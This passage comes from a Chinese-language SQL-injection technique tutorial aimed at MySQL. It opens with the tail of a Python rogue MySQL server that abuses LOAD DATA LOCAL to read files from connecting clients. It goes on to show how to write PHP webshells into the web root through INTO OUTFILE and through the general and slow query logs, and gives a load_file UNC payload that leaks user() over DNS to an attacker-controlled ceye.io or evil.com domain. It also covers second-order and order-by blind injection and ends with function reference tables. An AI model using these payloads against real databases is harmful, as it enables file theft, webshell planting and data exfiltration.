                            raise ValueError()
                    else:
                        if self.sub_state == 'File':
                            log.info('-- result')
                            log.info('Result: %r', data)
                            if len(data) == 1:
                                self.push(
                                    mysql_packet(packet, '\0\0\0\x02\0\0\0')
                                )
                                raise LastPacket()
                            else:
                                self.set_terminator(3)
                                self.state = 'LEN'
                                self.order = packet.packet_num + 1
                        elif self.sub_state == 'Auth':
                            self.push(mysql_packet(
                                packet, '\0\0\0\x02\0\0\0'
                            ))
                            raise LastPacket()
                        else:
                            log.info('-- else')
                            raise ValueError('Unknown packet')
                except LastPacket:
                    log.info('Last packet')
                    self.state = 'LEN'
                    self.sub_state = None
                    self.order = 0
                    self.set_terminator(3)
                except OutOfOrder:
                    log.warning('Out of order')
                    self.push(None)
                    self.close_when_done()
            else:
                log.error('Unknown state')
                self.push('None')
                self.close_when_done()
    class mysql_listener(asyncore.dispatcher):
        def __init__(self, sock=None):
            asyncore.dispatcher.__init__(self, sock)
            if not sock:
                self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
                self.set_reuse_addr()
                try:
                    self.bind(('', PORT))
                except socket.error:
                    exit()
                self.listen(5)
        def handle_accept(self):
            pair = self.accept()
            if pair is not None:
                log.info('Conn from: %r', pair[1])
                tmp = http_request_handler(pair)
    z = mysql_listener()
    daemonize()
    asyncore.loop()
需要注意的是：这个过程需要客户端允许使用`load data local`才行，不过这个信息在客户端尝试连接到服务端的数据包中可以找到。
### 写
说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下：
    select 1,"" into outfile '/var/www/html/1.php';
    select 2,"" into dumpfile '/var/www/html/1.php';
限制：
  * `secure-file-priv`无值或为可利用的目录
  * 需知道目标目录的绝对目录地址
  * 目标目录可写，mysql的权限足够。
#### 日志法
由于mysql在5.5.53版本之后，`secure-file-priv`的值默认为`NULL`，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。
mysql日志文件的一些相关设置可以直接通过命令来进行：
    //请求日志
    mysql> set global general_log_file = '/var/www/html/1.php';
    mysql> set global general_log = on;
    //慢查询日志
    mysql> set global slow_query_log_file='/var/www/html/2.php'
    mysql> set global slow_query_log=1;
    //还有其他很多日志都可以进行利用
    ...
之后我们在让数据库执行满足记录条件的恶意语句即可。
限制：
  * 权限够，可以进行日志的设置操作
  * 知道目标目录的绝对路径
## DNSLOG带出数据
什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。
如何用DNSLOG带出数据？若我们想要查询的数据为：`aabbcc`，那么我们让mysql服务端去请求`aabbcc.evil.com`，通过记录`evil.com`的DNS记录，就可以得到数据：`aabbcc`。
>
> 
>
> 引自：[Dnslog在SQL注入中的实战](https://www.anquanke.com/post/id/98096)
payload: `load_file(concat('\\\\',(select user()),'.xxxx.ceye.io\xxxx'))`
应用场景：
  * 三大注入无法使用
  * 有文件读取权限及`secure-file-priv`无值。
  * 不知道网站/目标文件/目标目录的绝对路径
  * 目标系统为Windows
推荐平台：[ceye.io](http://ceye.io/)
为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以`\\`开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个`\\\\`中的两个`\`是用来进行转义处理的。
## 二次注入
什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。
举个例子，某个查询当先登录的用户信息的SQL语句如下：
    select * from users where username='$_SESSION['username']'
登录/注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。
对于上述举的语句我们可以先注册一个名为`admin'
#`的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。
在我们进行登录操作的时候，我们用注册的`admin'
#`登录系统，并将用户部分数据存储在对于的SESSION中，如`$_SESSION['username']`。
上述的`$_SESSION['username']`并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为：
    select * from users where username='admin' #'
## order by比较盲注
这种方法运用的情况比较极端一些，如布尔盲注时，字符截取/比较限制很严格。例子：
    select * from users where (select 'r' union select user() order by 1 limit 1)='r'
如果能一眼看出原理的话就不需要继续看下去了。
实际上此处是利用了`order
by`语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则`limit`语句将不会让其输出，那么整个条件将会成立，否之不成立。
利用这种方法可以做到不需要使用`like、rlike、regexp`等匹配语句以及字符操作函数。
再举个例子：
    select username,flag,password from users where username='$username;'
页面回显的字段为：username与password，如何在`union`与`flag`两单词被拦截、无报错信息返回的情况下获取到用户名为`admin`的flag值？
我们前边讲到了无列名注入，通过使用`union`语句来对未知列名进行重命名的形式绕过，还讲过通过使用`join
using()`报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？
使用`order by`可轻松盲注出答案。payload：
    select username,flag,password from users where username='admin' union select 1,'a',3 order by 2
与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。
## 常见函数/符号归类
### 注释符
单行注释 | 单行注释 | 单行注释 | 多行(内联)注释  
---|---|---|---  
`#` | `-- x //x为任意字符` | `;%00` | `/*任意内容*/`  
### 常用运算符
运算符 | 说明 | 运算符 | 说明  
---|---|---|---  
&& | 与，同and。 | \ | \ |  | 或，同or。  
! | 非，同not。 | ~ | 一元比特反转。  
^ | 异或，同xor。 | + | 加，可替代空格，如`select+user()`。  
### 系统信息函数
函数 | 说明  
---|---  
USER() | 获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。  
DATABASE() | 获取当前选择的数据库名，同SCHEMA()。  
VERSION() | 获取当前版本信息。  
### 进制转换
函数 | 说明  
---|---  
ORD(str) | 返回字符串第一个字符的ASCII值。  
OCT(N) | 以字符串形式返回 `N` 的八进制数，`N` 是一个BIGINT 型数值，作用相当于`CONV(N,10,8)`。  
HEX(N_S) | 参数为字符串时，返回 `N_or_S` 的16进制字符串形式，为数字时，返回其16进制数形式。  
UNHEX(str) | `HEX(str)` 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。  
BIN(N) | 返回十进制数值 `N` 的二进制数值的字符串表现形式。  
ASCII(str) | 同`ORD(string)`。  
CONV(N,from_base,to_base) | 将数值型参数 `N` 由初始进制 `from_base` 转换为目标进制 `to_base`
的形式并返回。  
CHAR(N,... [USING charset_name]) | 将每一个参数 `N` 都解释为整数，返回由这些整数在 ASCII
码中所对应字符所组成的字符串。  
### 字符截取/拼接
函数 | 说明  
---|---  
SUBSTR(str,N_start,N_length) | 对指定字符串进行截取，为SUBSTRING的简单版。  
SUBSTRING() | 多种格式`SUBSTRING(str,pos)、SUBSTRING(str FROM
pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)`。  
RIGHT(str,len) | 对指定字符串从 **最右边** 截取指定长度。  
LEFT(str,len) | 对指定字符串从 **最左边** 截取指定长度。  
RPAD(str,len,padstr) | 在 `str` 右方补齐 `len` 位的字符串 `padstr`，返回新字符串。如果 `str` 长度大于
`len`，则返回值的长度将缩减到 `len` 所指定的长度。  
LPAD(str,len,padstr) | 与RPAD相似，在`str`左边补齐。  
MID(str,pos,len) | 同于 `SUBSTRING(str,pos,len)`。  
INSERT(str,pos,len,newstr) | 在原始字符串 `str` 中，将自左数第 `pos` 位开始，长度为 `len`
个字符的字符串替换为新字符串 `newstr`，然后返回经过替换后的字符串。`INSERT(str,len,1,0x0)`可当做截取函数。  
CONCAT(str1,str2...) | 函数用于将多个字符串合并为一个字符串  
GROUP_CONCAT(...) | 返回一个字符串结果，该结果由分组中的值连接组合而成。  
MAKE_SET(bits,str1,str2,...) |
根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：`EXP(MAKE_SET((LENGTH(DATABASE())>8)+1,'1','710'))`。  
### 常见全局变量
变量 | 说明 | 变量 | 说明  
---|---|---|---  
@@VERSION | 返回版本信息 | @@HOSTNAME | 返回安装的计算机名称  
@@GLOBAL.VERSION | 同`@@VERSION` | @@BASEDIR | 返回MYSQL绝对路径  
PS：查看全部全局变量`SHOW GLOBAL VARIABLES;`。
### 其他常用函数/语句
函数/语句 | 说明  
---|---  
LENGTH(str) | 返回字符串的长度。  
PI() | 返回π的具体数值。  
REGEXP "statement" | 正则匹配数据，返回值为布尔值。  
LIKE "statement" | 匹配数据，%代表任意内容。返回值为布尔值。  
RLIKE "statement" | 与regexp相同。  
LOCATE(substr,str,[pos]) | 返回子字符串第一次出现的位置。  
POSITION(substr IN str) | 等同于 `LOCATE()`。  
LOWER(str) | 将字符串的大写字母全部转成小写。同：`LCASE(str)`。  
UPPER(str) | 将字符串的小写字母全部转成大写。同：`UCASE(str)`。  